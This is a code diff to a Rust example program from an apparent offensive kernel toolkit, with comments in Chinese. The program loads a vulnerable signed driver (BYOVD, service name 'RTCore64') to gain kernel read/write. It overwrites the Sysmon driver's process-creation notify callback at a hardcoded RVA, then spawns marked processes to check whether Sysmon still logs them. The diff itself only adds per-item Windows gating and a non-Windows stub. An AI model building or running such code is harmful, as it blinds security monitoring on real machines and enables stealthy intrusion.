@@ -17,13 +17,18 @@
 //!
 //! ⚠️ 只动 slot[5]，绝不碰 slot[0] (ntoskrnl 内部)。
 
-#![cfg(target_os = "windows")]
 
+
+#[cfg(target_os = "windows")]
 use core::ffi::c_void;
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::offsets::notify_routines;
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::KernelRw;
 
+#[cfg(target_os = "windows")]
 const SYS_PATH: &[u16] = &[
     'S' as u16,
     'y' as u16,
@@ -56,12 +61,16 @@ const SYS_PATH: &[u16] = &[
     's' as u16,
     0,
 ];
+#[cfg(target_os = "windows")]
 const SVC_NAME: &[u16] = &[
     'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
 ];
+#[cfg(target_os = "windows")]
 const PSP_CREATE_PROCESS_NOTIFY_RVA: u32 = 0x4D9D70;
+#[cfg(target_os = "windows")]
 const SYSTEM_MODULE_INFORMATION: u32 = 11;
 
+#[cfg(target_os = "windows")]
 extern "system" {
     fn RtlAdjustPrivilege(
         privilege: u32,
@@ -72,6 +81,7 @@ extern "system" {
     fn NtQuerySystemInformation(class: u32, buf: *mut c_void, buflen: u32, retlen: *mut u32)
         -> i32;
 }
+#[cfg(target_os = "windows")]
 fn enable_privileges() {
     for luid in [10u32, 20u32] {
         let mut p: i32 = 0;
@@ -80,6 +90,7 @@ fn enable_privileges() {
 }
 
 #[repr(C)]
+#[cfg(target_os = "windows")]
 struct RtlModule {
     _h: [*mut c_void; 3],
     image_size: u32,
@@ -87,6 +98,7 @@ struct RtlModule {
 }
 
 /// 拿 (base, size) for 指定驱动短名（含匹配），用于红线验证 routine 归属。
+#[cfg(target_os = "windows")]
 fn find_module(name_lower: &str) -> Option<(usize, usize)> {
     let mut buf = vec![0u8; 256 * 1024];
     let mut rl: u32 = 0;
@@ -136,6 +148,7 @@ fn find_module(name_lower: &str) -> Option<(usize, usize)> {
 }
 
 /// 计数最近 N 秒内的 Sysmon EID1 事件（走 PowerShell 事件日志查询）。
+#[cfg(target_os = "windows")]
 fn count_sysmon_eid1(seconds: u64) -> usize {
     // 用字符串拼接避免 Rust format! 与 PowerShell @{} 的转义冲突。
     let cmd = "$ev=@(Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1; StartTime=(Get-Date).AddSeconds(-"
@@ -153,6 +166,7 @@ fn count_sysmon_eid1(seconds: u64) -> usize {
 }
 
 /// 启 N 个 throwaway 进程产生 EID1 事件。
+#[cfg(target_os = "windows")]
 fn spawn_n(n: u32, label: &str) {
     for _ in 0..n {
         let _ = std::process::Command::new("cmd.exe")
@@ -167,6 +181,7 @@ fn spawn_n(n: u32, label: &str) {
 /// 启一个带唯一标记的进程（用 set 创建带 marker 的环境，cmd 报告 marker），
 /// 然后查 Sysmon EID1 里 Image 字段含该 marker 的进程是否被记录。
 /// 返回是否在 Sysmon 日志里找到该 marker。
+#[cfg(target_os = "windows")]
 fn spawn_marked_and_check(marker: &str) -> bool {
     // 启一个 cmd 用 marker 作为窗口标题（Sysmon EID1 记录 CommandLine）。
     let _ = std::process::Command::new("cmd.exe")
@@ -186,6 +201,7 @@ fn spawn_marked_and_check(marker: &str) -> bool {
 }
 
 /// 启一个带 MARKER_ 前缀唯一标记的 cmd（marker 出现在命令行，Sysmon EID1 CommandLine 字段会含它）。
+#[cfg(target_os = "windows")]
 fn spawn_with_marker(marker: &str) {
     // 用 echo 把 marker 写进命令行，Sysmon CommandLine 会记录 "cmd /c echo MARKER_xxx"
     let arg = format!("echo MARKER_{}", marker);
@@ -195,6 +211,7 @@ fn spawn_with_marker(marker: &str) {
     std::thread::sleep(std::time::Duration::from_millis(800));
 }
 
+#[cfg(target_os = "windows")]
 fn main() {
     println!("[callback_repurpose_test] repurpose SysmonDrv callback (DATA write)");
     enable_privileges();
@@ -361,4 +378,24 @@ fn main() {
 
     println!("\n[callback_repurpose_test] DONE.");
     std::mem::forget(loaded);
+}
+
+
+// ----------------------------------------------------------------------------
+// Non-Windows entry-point fallback (E0601 mitigation).
+//
+// The real `fn main()` (and every Windows-only item above) is gated by
+// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
+// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
+// body compiles to nothing and the build would fail with E0601 ("main
+// function not found"). This stub exists solely to satisfy the crate root on
+// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
+// mutually exclusive with the Windows `main` above and never runs on target.
+// ----------------------------------------------------------------------------
+#[cfg(not(target_os = "windows"))]
+fn main() {
+    eprintln!(
+        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
+        env!("CARGO_BIN_NAME")
+    );
 }
